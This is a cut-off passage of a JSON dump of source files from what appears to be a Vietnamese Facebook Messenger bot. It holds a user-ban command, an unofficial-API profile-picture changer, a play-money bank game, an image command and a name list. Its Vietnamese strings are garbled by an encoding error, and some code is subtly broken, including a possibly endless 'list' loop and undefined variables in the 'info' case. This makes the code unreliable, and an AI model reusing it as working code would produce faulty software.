%1\\n- C√°c l·ªánh c·∫ßn g·ª° c·∫•m: %2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n\n    \"returnResult\": \"ƒê√¢y l√† k·∫øt qu·∫£ ph√π h·ª£p: \\n\",\n    \"returnNull\": \"Kh√¥ng t√¨m th·∫•y k·∫øt qu·∫£ d·ª±a v√†o t√¨m ki·∫øm c·ªßa b·∫°n!\",\n    \"returnList\": \"[ User List ]\\nHi·ªán t·∫°i ƒëang c√≥ %1 ng∆∞·ªùi d√πng b·ªã ban, d∆∞·ªõi ƒë√¢y l√† %2 ng∆∞·ªùi d√πng\\n\\n%3\",\n    \"returnInfo\": \"[ Info User ] ƒê√¢y l√† m·ªôt s√¥ th√¥ng tin v·ªÅ ng∆∞·ªùi d√πng b·∫°n c·∫ßn t√¨m:\\n- ID v√† t√™n c·ªßa ng∆∞·ªùi d√πng: %1n- C√≥ b·ªã ban?: %2 %3 %4\\n- B·ªã ban l·ªánh?: %5\"\n  },\n  \"en\": {\n    \"reason\": \"Reason\",\n    \"at\": \"At\",\n    \"allCommand\": \"All commands\",\n    \"commandList\": \"Commands\",\n    \"banSuccess\": \"[ Ban User ] Banned user: %1\",\n    \"unbanSuccess\": \"[ Unban User ] Unbanned user %1\",\n    \"banCommandSuccess\": \"[ banCommand User ] Banned command with user: %1\",\n    \"unbanCommandSuccess\": \"[ UnbanCommand User ] Unbanned command %1 with user: %2\",\n    \"errorReponse\": \"%1 Can't do what you request\",\n    \"IDNotFound\": \"%1 ID you import doesn't exist in database\",\n    \"existBan\": \"[ Ban User ] User %1 has been banned before %2 %3\",\n    \"notExistBan\": \"[ Unban User ] User hasn't been banned before\",\n    \"missingCommandInput\": \"%1 You have to import the command you want to ban!\",\n    \"notExistBanCommand\": \"[ UnbanCommand User ] User ID hasn't been banned before\",\n\n    \"returnBan\": \"[ Ban User ] You are requesting to ban user:\\n- User ID and name who you want to ban: %1%2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnUnban\": \"[ Unban User ] You are requesting to unban user:\\n- User ID and name who you want to ban: %1\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnBanCommand\": \"[ banCommand User ] You are requesting to ban command with user:\\n - User ID and name who you want to ban: %1\\n- Commands: %2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnUnbanCommand\": \"[ UnbanCommand User ] You are requesting to unban command with user:\\n - User ID and name: %1\\n- Commands: %2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n\n    \"returnResult\": \"This is your result: \\n\",\n    \"returnNull\": \"There is no result with your input!\",\n    \"returnList\": \"[ User List ]\\There are %1 banned user, here are %2 user\\n\\n%3\",\n    \"returnInfo\": \"[ Info User ] Here is some information about the user who you want to find:\\n- User ID and name: %1n- Banned?: %2 %3 %4\\n- Command banned?: %5\"\n  }\n}\n\nmodule.exports.handleReaction = async ({ event, api, Users, handleReaction, getText }) => {\n  if (parseInt(event.userID) !== parseInt(handleReaction.author)) return;\n  const moment = require(\"moment-timezone\");\n  const { threadID } = event;\n  const { messageID, type, targetID, reason, commandNeedBan, nameTarget } = handleReaction;\n\n  const time = moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:MM:ss L\");\n  global.client.handleReaction.splice(global.client.handleReaction.findIndex(item => item.messageID == messageID), 1);\n\n  switch (type) {\n    case \"ban\": {\n      try {\n        if(event.type == \"message_reply\") { targetID = event.messageReply.senderID }\n        let data = (await Users.getData(targetID)).data || {};\n        data.banned = true;\n        data.reason = reason || null;\n        data.dateAdded = time;\n        await Users.setData(targetID, { data });\n        global.data.userBanned.set(targetID, { reason: data.reason, dateAdded: data.dateAdded });\n        return api.sendMessage(getText(\"banSuccess\", `${targetID} - ${nameTarget}`), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch { return api.sendMessage(getText(\"errorReponse\", \"[ Ban User ]\"), threadID) };\n    }\n\n    case \"unban\": {\n      try {\n        if(event.type == \"message_reply\") { targetID = event.messageReply.senderID }\n        let data = (await Users.getData(targetID)).data || {};\n        data.banned = false;\n        data.reason = null;\n        data.dateAdded = null;\n        await Users.setData(targetID, { data });\n        global.data.userBanned.delete(targetID);\n        return api.sendMessage(getText(\"unbanSuccess\", `${targetID} - ${nameTarget}`), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch { return api.sendMessage(getText(\"errorReponse\", \"[ Unban User ]\"), threadID) };\n    }\n\n    case \"banCommand\": {\n      try {\t\n        let data = (await Users.getData(targetID)).data || {};\n        data.commandBanned = [...data.commandBanned || [], ...commandNeedBan];\n        await Users.setData(targetID, { data });\n        global.data.commandBanned.set(targetID, data.commandBanned);\n        return api.sendMessage(getText(\"banCommandSuccess\", `${targetID} - ${nameTarget}`), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch (e) { return api.sendMessage(getText(\"errorReponse\", \"[ banCommand User ]\"), threadID) };\n    }\n\n    case \"unbanCommand\": {\n      try {\n        let data = (await Users.getData(targetID)).data || {};\n        data.commandBanned = [...data.commandBanned.filter(item => !commandNeedBan.includes(item))];\n        await Users.setData(targetID, { data });\n        global.data.commandBanned.set(targetID, data.commandBanned);\n        if(data.commandBanned.length == 0) global.data.commandBanned.delete(targetID)\n        return api.sendMessage(getText(\"unbanCommandSuccess\", ((data.commandBanned.length == 0) ? getText(\"allCommand\") : `${getText(\"commandList\")}: ${commandNeedBan.join(\", \")}`), `${targetID} - ${nameTarget}`), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch (e) { return api.sendMessage(getText(\"errorReponse\", \"[ UnbanCommand User ]\"), threadID) };\n    }\n  }\n}\n\nmodule.exports.run = async ({ event, api, args, Users, getText }) => {\n  const { threadID, messageID } = event;\n  const type = args[0];\n  var targetID = String(args[1]);\n  var reason = (args.slice(2, args.length)).join(\" \") || null;\n\n  if (isNaN(targetID)) {\n    const mention = Object.keys(event.mentions);\n    args = args.join(\" \");\n    targetID = String(mention[0]);\n    reason = (args.slice(args.indexOf(event.mentions[mention[0]]) + (event.mentions[mention[0]] || \"\").length + 1, args.length)) || null;\n  }\n\n  switch (type) {\n    case \"ban\":\n    case \"-b\": {\n      if(event.type == \"message_reply\") { targetID = event.messageReply.senderID }\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ Ban User ]\"), threadID, messageID);\n      if (global.data.userBanned.has(targetID)) {\n        const { reason, dateAdded } = global.data.userBanned.get(targetID) || {};\n        return api.sendMessage(getText(\"existBan\", targetID, ((reason) ? `${getText(\"reason\")}: \"${reason}\"` : \"\"), ((dateAdded) ? `${getText(\"at\")} ${dateAdded}` : \"\")), threadID, messageID);\n      }\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnBan\", `${targetID} - ${nameTarget}`, ((reason) ? `\\n- ${getText(\"reason\")}: ${reason}` : \"\")), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"ban\",\n          targetID,\n          reason,\n          nameTarget,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"unban\":\n    case \"-ub\": {\n      if(event.type == \"message_reply\") { targetID = event.messageReply.senderID }\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ Unban User ]\"), threadID, messageID);\n      if (!global.data.userBanned.has(targetID)) return api.sendMessage(getText(\"notExistBan\"), threadID, messageID);\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnUnban\", `${targetID} - ${nameTarget}`), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"unban\",\n          targetID,\n          nameTarget,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"search\":\n    case \"-s\": {\n      const contentJoin = reason || \"\";\n      const getUsers = (await Users.getAll(['userID', 'name'])).filter(item => !!item.name);\n      var matchUsers = [], a = '', b = 0;\n      getUsers.forEach(i => {\n        if (i.name.toLowerCase().includes(contentJoin.toLowerCase())) {\n          matchUsers.push({\n            name: i.name,\n            id: i.userID\n          });\n        }\n      });\n      matchUsers.forEach(i => a += `\\n${b += 1}. ${i.name} - ${i.id}`);\n      (matchUsers.length > 0) ? api.sendMessage(getText(\"returnResult\", a), threadID) : api.sendMessage(getText(\"returnNull\"), threadID);\n      return;\n    }\n\n    case \"banCommand\":\n    case \"-bc\": {\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ BanCommand User ]\"), threadID, messageID);\n      if (reason == null || reason.length == 0) return api.sendMessage(getText(\"missingCommandInput\", \"[ BanCommand User ]\"), threadID, messageID);\n      if (reason == \"all\") {\n        var allCommandName = [];\n        const commandValues = global.client.commands.keys();\n        for (const cmd of commandValues) allCommandName.push(cmd);\n        reason = allCommandName.join(\" \");\n      }\n      const commandNeedBan = reason.split(\" \");\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnBanCommand\", `${targetID} - ${nameTarget}`, ((commandNeedBan.length == global.client.commands.size) ? getText(\"allCommand\") : commandNeedBan.join(\", \"))), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"banCommand\",\n          targetID,\n          commandNeedBan,\n          nameTarget,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"unbanCommand\":\n    case \"-ubc\": {\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ UnbanCommand User ]\"), threadID, messageID);\n      if (!global.data.commandBanned.has(targetID)) return api.sendMessage(getText(\"notExistBanCommand\"), threadID, messageID);\n      if (reason == null || reason.length == 0) return api.sendMessage(getText(\"missingCommandInput\", \"[ UnbanCommand User ]\"), threadID, messageID);\n      if (reason == \"all\") {\n        reason = (global.data.commandBanned.get(targetID)).join(\" \");\n      }\n      const commandNeedBan = reason.split(\" \");\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnUnbanCommand\", `${targetID} - ${nameTarget}`, ((commandNeedBan.length == global.data.commandBanned.get(targetID).length) ? getText(\"allCommand\") : commandNeedBan.join(\", \"))), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"unbanCommand\",\n          targetID,\n          commandNeedBan,\n          nameTarget,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"list\":\n    case \"-l\": {\n      var listBan = [], i = 0;\n      const threadData = global.data.userBanned.keys();\n      for (; ;) {\n        let idUser = String(threadData.next().value);\n        if (typeof idUser == \"undefined\") {\n          const userName = (await Users.getData(idUser)).name || \"unknown\";\n          listBan.push(`${i+=1}/ ${idUser} - ${userName}`);\n        }\n        if (i == global.data.userBanned.size || i == (parseInt(reason) || 10)) break;\n      }\n      return api.sendMessage(getText(\"returnList\",(global.data.userBanned.size || 0), listBan.length, listBan.join(\"\\n\")), threadID, messageID);\n    }\n\n    case \"info\":\n    case \"-i\": {\n      if(event.type == \"message_reply\") { targetID = event.messageReply.senderID }\n      if (!global.data.allUserID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ Info User ]\"), threadID, messageID);\n      if (global.data.commandBanned.has(targetID)) { var commandBanned = global.data.commandBanned.get(targetID) || [] };\n      if (global.data.userBanned.has(targetID)) { var { reason, dateAdded } = global.data.userBanned.get(targetID) || {} };\n      const nameTarget = global.data.userName.get(targetID) || await Users.getNameUser(targetID);\n      return api.sendMessage(getText(\"returnInfo\", `${targetID} - ${nameTarget}`, ((!dateAdded) ? \"YES\" : \"NO\"), ((reason) ? `${getText(\"reson\")}: \"${reason}\"` : \"\"), ((dateAdded) ? `${getText(\"at\")}: ${dateAdded}` : \"\"), ((commandBanned) ? `YES: ${(commandNeedBan.length == global.client.commands.size) ? getText(\"allCommand\") : commandNeedBan.join(\", \")}` : \"NO\")), threadID, messageID);\n    }\n  }\n}","path":null,"size_bytes":15333,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeAvt.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n/**\n * It posts an image to a Facebook profile\n * @param Api - The API object\n * @param BotID - The ID of the bot you want to post the image to.\n * @param form - The form data that you want to send.\n * @returns The JSON.parse(Data.split(\"for (;;);\")[1]); is returning the following:\n * {\"__ar\":1,\"payload\":null,\"jsmods\":{\"require\":[[\"ImageUploader\",\"uploadPhoto\",[{\"__m\":\"__elem_0\"},{\"__m\":\"__elem_1\"},{\"__m\":\"__elem_2\"},{\"__m\":\"__\n */\nasync function postImage(Api,BotID,form) {\n    var Data = await Api.httpPostFormData(`https://www.facebook.com/profile/picture/upload/?profile_id=${BotID}&photo_source=57&av=${BotID}`, form);\n    return JSON.parse(Data.split(\"for (;;);\")[1]);\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n/* Changing the profile picture of the bot. */\n    return function changeAvt(link, caption, callback) {\n        var resolveFunc = function() {};\n        var rejectFunc = function() {};\n        var returnPromise = new Promise(function(resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function(err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n        try {\n            var Fetch = require('axios')\n            Fetch.get(link, { responseType: \"stream\" }).then(data => { \n                postImage(api, ctx.userID, { file: data.data }).then(data => {\n                    if (data.error) throw new Error({ error: data.error, des: data.error.errorDescription });\n                    var form = {\n                        av: ctx.userID,\n                            fb_api_req_friendly_name: \"ProfileCometProfilePictureSetMutation\",\n                            fb_api_caller_class: \"RelayModern\",\n                            doc_id: \"5066134240065849\",\n                            variables: JSON.stringify({\n                                input: {\n                                    caption: (caption || \"\"),\n                                    existing_photo_id: data.payload.fbid,\n                                    expiration_time: null,\n                                    profile_id: ctx.userID,\n                                    profile_pic_method: \"EXISTING\",\n                                    profile_pic_source: \"TIMELINE\",\n                                scaled_crop_rect: {\n                                    height: 1,\n                                    width: 1,\n                                    x: 0,\n                                    y: 0\n                                },\n                                skip_cropping: true,\n                                actor_id: ctx.userID,\n                                client_mutation_id: Math.round(Math.random() * 19).toString()\n                                },\n                            isPage: false,\n                            isProfile: true,\n                            scale: 3,\n                        })\n                    };\n                    defaultFuncs\n                        .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n                        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n                        .then(function(resData) {\n                            if (resData.error) throw resData;\n                            else return callback(null,true)\n                        })\n                        .catch(function(err) {\n                        return callback(err);\n                    });\n                })\n            })  \n        }\n        catch (e) {\n            throw e;\n        }\n        return returnPromise;\n    };\n};","path":null,"size_bytes":3737,"size_tokens":null},"modules/commands/bank.js":{"content":"const moment = require('moment-timezone');\n\nmodule.exports.config = {\n    name: \"bank\",\n    version: \"0.0.1\",\n    hasPermssion: 0,\n    credits: \"D-Jukie-keychinhle (chinhle ƒë√£ s·ªßi)\",\n    description: \"\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"\",\n    cooldowns: 0,\n    dependencies: {\n        \"fs-extra\": \"\",\n        \"request\": \"\",\n        \"axios\": \"\"\n    }\n};\n\nmodule.exports.onLoad = async () => {\n    const { existsSync, writeFileSync, mkdirSync } = require(\"fs-extra\");\n    const { join } = require(\"path\");\n    const dir = join(__dirname, 'data');\n    if (!existsSync(dir)) mkdirSync(dir, { recursive: true });\n    const pathData = join(__dirname, 'data/bank.json');\n    if (!existsSync(pathData)) writeFileSync(pathData, \"[]\", \"utf-8\");\n\n    setInterval(checkAndCalculateInterest, 1 * 60 * 60 * 1000);\n    return;\n};\n\nasync function checkAndCalculateInterest() {\n    const { readFileSync, writeFileSync } = require(\"fs-extra\");\n    const { join } = require(\"path\");\n    const pathData = join(__dirname, 'data/bank.json');\n    const laisuat = 0.05;\n\n    let user = JSON.parse(readFileSync(pathData, \"utf-8\"));\n    const now = moment();\n\n    user = user.map(account => {\n        if (!account.lastInterestTime) {\n            account.lastInterestTime = now.toISOString();\n            return account;\n        }\n\n        const lastTime = moment(account.lastInterestTime);\n        const diffHours = now.diff(lastTime, 'hours');\n\n        if (diffHours >= 12) {\n            // T√≠nh l√£i\n            let updatedMoney = BigInt(account.money) + (BigInt(account.money) * BigInt(Math.floor(laisuat * 100))) / BigInt(100); \n            account.money = String(updatedMoney);\n            account.lastInterestTime = now.toISOString();\n        }\n\n        return account;\n    });\n\n    writeFileSync(pathData, JSON.stringify(user, null, 2));\n    console.log('ƒê√£ ki·ªÉm tra v√† t√≠nh l√£i n·∫øu ƒë·ªß 12 gi·ªù.');\n}\n\nmodule.exports.run = async function({ api, event, args, Currencies }) {\n    const { threadID, messageID, senderID } = event;\n    const { readFileSync, writeFileSync } = require(\"fs-extra\");\n    const { join } = require(\"path\");\n    const pathData = join(__dirname, 'data/bank.json');\n    const timeIM = 12; \n\n    try {\n        let user = JSON.parse(readFileSync(pathData, \"utf-8\"));\n\n        if (args[0] == '-r' || args[0] == 'register') {\n            if (!user.find(i => i.senderID == senderID)) {\n                const newUser = { senderID: senderID, money: \"0\", lastInterestTime: moment().toISOString() };\n                user.push(newUser);\n                writeFileSync(pathData, JSON.stringify(user, null, 2));\n                return api.sendMessage(`[ ‚úÖ SUCCESS ] - B·∫°n ƒë√£ ƒëƒÉng k√≠ th√†nh c√¥ng, g·ª≠i √≠t nh·∫•t 10000$ ƒë·ªÉ c√≥ l√£iüí∞`, threadID, messageID);\n            } else {\n                return api.sendMessage(`[ ‚ö†Ô∏è WARNING ] - B·∫°n ƒë√£ c√≥ t√†i kho·∫£n tr√™n h·ªá th·ªëng MIRAI Banküè¶`, threadID, messageID);\n            }\n        }\n\n        if (args[0] == 'check' || args[0] == 'coins') {\n            if (!user.find(i => i.senderID == senderID)) {\n                return api.sendMessage(`[‚ö†Ô∏è WARNING] - B·∫°n ch∆∞a ƒëƒÉng k√≠ s·ª≠ d·ª•ng banking, ${global.config.PREFIX}${this.config.name} register ƒë·ªÉ ƒëƒÉng k√≠üè¶`, threadID, messageID);\n            } else {\n                const userData = user.find(i => i.senderID == senderID);\n                const lastInterestTime = moment(userData.lastInterestTime).format('HH:mm:ss DD/MM/YYYY');\n                return api.sendMessage(`[ BANKING ] - S·ªë ti·ªÅn b·∫°n g·ª≠i Mirai Bank l√†: ${formatNumber(userData.money)}$\\nüí∑ L√£i: 5% m·ªói ${timeIM} gi·ªù\\nüïí L·∫ßn cu·ªëi t√≠nh l√£i: ${lastInterestTime}`, threadID, messageID);\n            }\n        }\n\n        if (args[0] == 'g·ª≠i' || args[0] == 'send') {\n            if (!args[1] || isNaN(args[1])) return api.sendMessage(\"[‚ùé FAILED] - S·ªë ti·ªÅn g·ª≠i v√†o ph·∫£i l√† m·ªôt con s·ªë\", threadID, messageID);\n            if (!user.find(i => i.senderID == senderID)) {\n                return api.sendMessage(`[‚ö†Ô∏è WARNING] - B·∫°n ch∆∞a ƒëƒÉng k√≠ s·ª≠ d·ª•ng banking, ${global.config.PREFIX}${this.config.name} register ƒë·ªÉ ƒëƒÉng k√≠üè¶`, threadID, messageID);\n            } else {\n                let balances = (await Currencies.getData(senderID)).money;\n                let balance = args[1] !== 'all' ? BigInt(args[1]) : BigInt(balances);\n                if (balance < 10000n) return api.sendMessage('[ ‚ö†Ô∏è WARNING ] - S·ªë ti·ªÅn g·ª≠i ng√¢n h√†ng ph·∫£i l·ªõn h∆°n 10,000', threadID, messageID);\n                if (balance > BigInt(balances)) return api.sendMessage(`[ ‚ö†Ô∏è WARNING ] - S·ªë d∆∞ kh√¥ng ƒë·ªß ${formatNumber(balance)} ƒë·ªÉ g·ª≠i v√†o Mirai Banküí∞`, threadID, messageID);\n\n                let userData = user.find(i => i.senderID == senderID);\n                userData.money = String(BigInt(userData.money) + balance);\n\n                writeFileSync(pathData, JSON.stringify(user, null, 2));\n                await Currencies.decreaseMoney(senderID, Number(balance));\n                return api.sendMessage(`[ ‚úÖ SUCCESS ] - B·∫°n v·ª´a g·ª≠i ${formatNumber(balance)}$ v√†o Mirai Bank\\nüí∑ L√£i: 5% m·ªói ${timeIM} gi·ªù`, threadID, messageID);\n            }\n        }\n\n        if (args[0] == 'r√∫t' || args[0] == 'l·∫•y') {\n            if (!args[1] || isNaN(args[1])) return api.sendMessage(\"[‚ö†Ô∏è WARNING] - Vui l√≤ng nh·∫≠p s·ªë ti·ªÅn üí∞\", threadID, messageID);\n            if (!user.find(i => i.senderID == senderID)) {\n                return api.sendMessage(`[‚ö†Ô∏è WARNING] - B·∫°n ch∆∞a ƒëƒÉng k√≠ s·ª≠ d·ª•ng banking, ${global.config.PREFIX}${this.config.name} register ƒë·ªÉ ƒëƒÉng k√≠üè¶`, threadID, messageID);\n            } else {\n                let userData = user.find(i => i.senderID == senderID);\n                let money = args[1] !== 'all' ? BigInt(args[1]) : BigInt(userData.money);\n                if (money < 10000n) return api.sendMessage('[ ‚ö†Ô∏è WARNING ] - S·ªë ti·ªÅn r√∫t ng√¢n h√†ng ph·∫£i l·ªõn h∆°n 10,000', threadID, messageID);\n                if (money > BigInt(userData.money)) return api.sendMessage('[ ‚ö†Ô∏è WARNING ] - S·ªë d∆∞ c·ªßa b·∫°n kh√¥ng ƒë·ªß ƒë·ªÉ th·ª±c hi·ªán giao d·ªãch n√†y!', threadID, messageID);\n\n                await Currencies.increaseMoney(senderID, Number(money));\n                userData.money = String(BigInt(userData.money) - money);\n                writeFileSync(pathData, JSON.stringify(user, null, 2));\n                return api.sendMessage(`[ BANKING ] - R√∫t th√†nh c√¥ng ${formatNumber(money)}$, s·ªë d∆∞ c√≤n l·∫°i l√† ${formatNumber(userData.money)}$`, threadID, messageID);\n            }\n        } else {\n            return api.sendMessage(`=====üè¶MIRAI BANKüè¶=====\\n\\n${global.config.PREFIX}${this.config.name} register -> ƒêƒÉng k√≠ g·ª≠i ti·ªÅn t·∫°i MIRAI Banküíπ\\n${global.config.PREFIX}${this.config.name} check -> Xem s·ªë ti·ªÅn trong MIRAI Banküí≥\\n${global.config.PREFIX}${this.config.name} g·ª≠i 10000 -> G·ª≠i ti·ªÅn v√†o Mirai Banküí∑\\n${global.config.PREFIX}${this.config.name} r√∫t 10000 -> R√∫t ti·ªÅn t·ª´ Mirai Banküí∞`, threadID, messageID);\n        }\n    } catch (e) {\n        console.error(e);\n        return api.sendMessage(\"[‚ö†Ô∏è ERROR] - ƒê√£ x·∫£y ra l·ªói trong qu√° tr√¨nh th·ª±c hi·ªán.\", threadID, messageID);\n    }\n};\n\nfunction formatNumber(number) {\n    return number.toString().replace(/\\B(?=(\\d{3})+(?!\\d))/g, \",\");\n}\n","path":null,"size_bytes":7453,"size_tokens":null},"modules/commands/anime.js":{"content":"module.exports.config = {\n  name: \"anime\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n\n  const anh = require('./../../img/anime1.json');\n  var image1 = anh[Math.floor(Math.random() * anh.length)].trim();\n  var image2 = anh[Math.floor(Math.random() * anh.length)].trim();\n  var image3 = anh[Math.floor(Math.random() * anh.length)].trim();\n  var image4 = anh[Math.floor(Math.random() * anh.length)].trim();\n\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Anime n√®',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1593,"size_tokens":null},"lib/Fca-Horizon-Remastered/test/testname.js":{"content":"function getGenderByPhysicalMethod(name) {\n    const female_name = [\n      \"Ph∆∞∆°ng Chi\",\n      \"An B√¨nh\",\n      \"An Di\",\n      \"An H·∫°\",\n      \"An H·∫±ng\",\n      \"An Kh√™\",\n      \"An Nhi√™n\",\n      \"An Nh√†n\",\n      \"Anh Chi\",\n      \"Anh H∆∞∆°ng\",\n      \"Anh Mai\",\n      \"Anh Ph∆∞∆°ng\",\n      \"Anh Thi\",\n      \"Anh Thy\",\n      \"Anh Th∆°\",\n      \"Anh Th∆∞\",\n      \"Anh Th·∫£o\",\n      \"Anh V≈©\",\n      \"Anh √ê√†o\",\n      \"Ban Mai\",\n      \"B√¨nh Minh\",\n      \"B√¨nh Y√™n\",\n      \"B√≠ch Chi√™u\",\n      \"B√≠ch Ch√¢u\",\n      \"B√≠ch Duy√™n\",\n      \"B√≠ch Hi·ªÅn\",\n      \"B√≠ch Hu·ªá\",\n      \"B√≠ch H√†\",\n      \"B√≠ch H·∫°nh\",\n      \"B√≠ch H·∫£i\",\n      \"B√≠ch H·∫£o\",\n      \"B√≠ch H·∫≠u\",\n      \"B√≠ch H·∫±ng\",\n      \"B√≠ch H·ªìng\",\n      \"B√≠ch H·ª£p\",\n      \"B√≠ch Lam\",\n      \"B√≠ch Li√™n\",\n      \"B√≠ch Loan\",\n      \"B√≠ch Nga\",\n      \"B√≠ch Ng√†\",\n      \"B√≠ch Ng√¢n\",\n      \"B√≠ch Ng·ªçc\",\n      \"B√≠ch Nh∆∞\",\n      \"B√≠ch Ph∆∞·ª£ng\",\n      \"B√≠ch Quy√™n\",\n      \"B√≠ch Qu√¢n\",\n      \"B√≠ch San\",\n      \"B√≠ch Thoa\",\n      \"B√≠ch Thu\",\n      \"B√≠ch Th·∫£o\",\n      \"B√≠ch Th·ªßy\",\n      \"B√≠ch Trang\",\n      \"B√≠ch Tr√¢m\",\n      \"B√≠ch Ty\",\n      \"B√≠ch V√¢n\",\n      \"B√≠ch √êi·ªáp\",\n      \"B√≠ch √ê√†o\",\n      \"BƒÉng BƒÉng\",\n      \"BƒÉng T√¢m\",\n      \"B·∫°ch C√∫c\",\n      \"B·∫°ch Hoa\",\n      \"B·∫°ch Kim\",\n      \"B·∫°ch Li√™n\",\n      \"B·∫°ch Loan\",\n      \"B·∫°ch Mai\",\n      \"B·∫°ch Qu·ª≥nh\",\n      \"B·∫°ch Tr√†\",\n      \"B·∫°ch Tuy·∫øt\",\n      \"B·∫°ch V√¢n\",\n      \"B·∫°ch Y·∫øn\",\n      \"B·∫£o Anh\",\n      \"B·∫£o B√¨nh\",\n      \"B·∫£o Ch√¢u\",\n      \"B·∫£o Hu·ªá\",\n      \"B·∫£o H√†\",\n      \"B·∫£o H√¢n\",\n      \"B·∫£o Lan\",\n      \"B·∫£o L·ªÖ\",\n      \"B·∫£o Ng·ªçc\",\n      \"B·∫£o Ph∆∞∆°ng\",\n      \"B·∫£o Quy√™n\",\n      \"B·∫£o Qu·ª≥nh\",\n      \"B·∫£o Thoa\",\n      \"B·∫£o Th√∫y\",\n      \"B·∫£o Ti√™n\",\n      \"B·∫£o Tr√¢m\",\n      \"B·∫£o Tr√¢n\",\n      \"B·∫£o Tr√∫c\",\n      \"B·∫£o Uy√™n\",\n      \"B·∫£o Vy\",\n      \"B·∫£o V√¢n\",\n      \"B·ªôi Linh\",\n      \"Cam Th·∫£o\",\n      \"Chi Lan\",\n      \"Chi Mai\",\n      \"Chi√™u D∆∞∆°ng\",\n      \"C√°t C√°t\",\n      \"C√°t Linh\",\n      \"C√°t Ly\",\n      \"C√°t Ti√™n\",\n      \"C√°t T∆∞·ªùng\",\n      \"C·∫©m Hi·ªÅn\",\n      \"C·∫©m H∆∞·ªùng\",\n      \"C·∫©m H·∫°nh\",\n      \"C·∫©m Linh\",\n      \"C·∫©m Li√™n\",\n      \"C·∫©m Ly\",\n      \"C·∫©m Nhi\",\n      \"C·∫©m Nhung\",\n      \"C·∫©m Th√∫y\",\n      \"C·∫©m T√∫\",\n      \"C·∫©m V√¢n\",\n      \"C·∫©m Y·∫øn\",\n      \"Di Nhi√™n\",\n      \"Di√™n V·ªπ\",\n      \"Di·ªÖm Chi\",\n      \"Di·ªÖm Ch√¢u\",\n      \"Di·ªÖm H∆∞∆°ng\",\n      \"Di·ªÖm H·∫°nh\",\n      \"Di·ªÖm H·∫±ng\",\n      \"Di·ªÖm Khu√™\",\n      \"Di·ªÖm Ki·ªÅu\",\n      \"Di·ªÖm Li√™n\",\n      \"Di·ªÖm L·ªôc\",\n      \"Di·ªÖm My\",\n      \"Di·ªÖm Ph√∫c\",\n      \"Di·ªÖm Ph∆∞∆°ng\",\n      \"Di·ªÖm Ph∆∞·ªõc\",\n      \"Di·ªÖm Ph∆∞·ª£ng\",\n      \"Di·ªÖm Quy√™n\",\n      \"Di·ªÖm Qu·ª≥nh\",\n      \"Di·ªÖm Th√∫y\",\n      \"Di·ªÖm Th∆∞\",\n      \"Di·ªÖm Th·∫£o\",\n      